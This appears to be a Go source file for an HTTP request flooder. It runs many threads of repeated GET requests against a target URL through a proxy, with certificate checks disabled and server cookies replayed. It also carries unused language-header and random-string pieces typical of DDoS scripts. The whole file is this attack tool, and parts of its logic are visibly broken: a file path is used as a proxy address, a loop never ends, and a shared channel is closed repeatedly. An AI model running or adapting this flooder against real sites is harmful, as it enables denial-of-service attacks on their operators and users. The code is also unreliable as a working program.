package main

import (
    "crypto/tls"
    "flag"
    "fmt"
    "net/http"
    url2 "net/url"
    "strings"
    "sync"
    "time"
		
		
	"net/http/cookiejar"
	"math/rand"
    "golang.org/x/net/http2"
)

var (	
    language = []string{
        "ko-KR", "en-US", "zh-CN", "zh-TW",
        "ja-JP", "en-GB", "en-AU", "en-CA",
        "en-NZ", "en-ZA", "en-IN", "en-PH",
        "en-SG", "en-ZA", "en-HK", "en-US",
        "*", "en-US,en;q=0.5",
        "utf-8, iso-8859-1;q=0.5, *;q=0.1",
        "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
        "en-GB, en-US, en;q=0.9", "de-AT, de-DE;q=0.9, en;q=0.5",
        "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
        "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
        "en-US,en;q=0.5", "en-US,en;q=0.9", "de-CH;q=0.7",
        "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "da, en-gb;q=0.8, en;q=0.7", "cs;q=0.5",
	}
)

type headersFlag []string

func (h *headersFlag) String() string {
    return fmt.Sprintf("%v", *h)
}

func (h *headersFlag) Set(value string) error {
    *h = append(*h, value)
    return nil
}

func main() {
	var requests int
	var timeSeconds int
	var threads int
	var proxyFile string
	var urlStr string
	var headers headersFlag

	flag.IntVar(&requests, "r", 64, "number of requests")
	flag.IntVar(&timeSeconds, "d", 0, "time to run the script (in seconds)")
	flag.IntVar(&threads, "t", 1, "number of threads to use")
	flag.StringVar(&proxyFile, "p", "hui.txt", "path to file with proxy addresses")
	flag.StringVar(&urlStr, "u", "", "URL to make requests to")
	flag.Var(&headers, "h", "headers for requests")

	flag.Parse()

    headersMap := make(map[string]string)
    for _, header := range headers {
        parts := strings.SplitN(header, "@", 2)
        if len(parts) == 2 {
            headersMap[parts[0]] = parts[1]
        }
    }

	if urlStr == "" {
		fmt.Println("Usage: go run main.go -u url -r requests -d time -p proxy -h headers -h headers -h...")
		return
	}

	startTime := time.Now()

	var wg sync.WaitGroup
	wg.Add(threads)
	
	jobs := make(chan int, threads*requests)

	for t := 0; t < threads; t++ {
		time.Sleep(2 * time.Millisecond)
		go func(threadNum int) {
			defer wg.Done()
			restart := true
			for restart {
				jar, err := cookiejar.New(nil)
				if err != nil {}
				
				client := &http.Client{
					Jar: jar,
					Transport: &http2.Transport{
						TLSClientConfig: &tls.Config{
							InsecureSkipVerify: true,
						},
						AllowHTTP: true,
					},
				}

				proxyURL, err := url2.Parse("http://" + proxyFile)
				if err != nil {
					return
				}			

				client.Transport = &http.Transport{Proxy: http.ProxyURL(proxyURL)}
				if timeSeconds > 0 && time.Since(startTime).Seconds() >= float64(timeSeconds) {
					return
				}

				req, err := http.NewRequest("GET", urlStr, nil)
				if err != nil {
					continue
				}

				for key, value := range headersMap {
					req.Header.Set(key, value)
				}
				
				for i := 0; i < requests; i++ {
					resp, err := client.Do(req)
					if err != nil {
						continue
					}						
					
					resp.Body.Close()

					var cookieStrings []string
					for _, cookie := range resp.Cookies() {
						cookieStr := fmt.Sprintf("%s=%s; Domain=%s; Path=%s", cookie.Name, cookie.Value, cookie.Domain, cookie.Path)
						cookieStrings = append(cookieStrings, cookieStr)
					}
					cookieHeader := strings.Join(cookieStrings, "; ")
					req.Header.Set("cookie", cookieHeader)
					//fmt.Printf(":status: %d\n", resp.StatusCode)	
					//fmt.Printf(":cookie: %s\n", cookieHeader)						
				}
			}
			for i := 0; i < threads*requests; i++ {
				jobs <- i
			}
			close(jobs)			
		}(t)
	}
	wg.Wait()
}


func randomString(length int, charSet string) string {
	rand.Seed(time.Now().UnixNano())
	var result strings.Builder
	characters := []rune(charSet)
	for i := 0; i < length; i++ {
		result.WriteRune(characters[rand.Intn(len(characters))])
	}
	return result.String()	
}
